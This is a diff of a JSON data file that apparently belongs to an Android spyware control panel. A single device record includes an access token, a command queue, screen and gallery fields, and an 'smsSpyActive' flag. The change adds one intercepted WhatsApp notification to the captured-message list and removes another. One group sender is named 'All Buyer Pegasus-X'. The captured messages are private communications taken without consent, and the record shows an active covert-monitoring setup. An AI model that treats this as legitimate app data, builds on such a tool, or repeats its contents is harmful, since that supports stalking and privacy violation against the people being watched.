@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046098268,
+    "lastSeen": 1775046101256,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13579 pesan): ~ cewek bauti 👅☝🏻",
+        "content": "nenek ingusan",
+        "time": "01/04 20:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046102632
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎All Buyer Pegasus-X ( No Update ) (248 pesan): ~ DEWANGGA",
@@ -4011,14 +4019,6 @@
         "time": "01/04 20:09",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045381161
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13433 pesan): ~ cewek bauti 👅☝🏻",
-        "content": "nebak nya selalu keduluan orang 😔",
-        "time": "01/04 20:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045380968
       }
     ],
     "galleryPhotos": [],
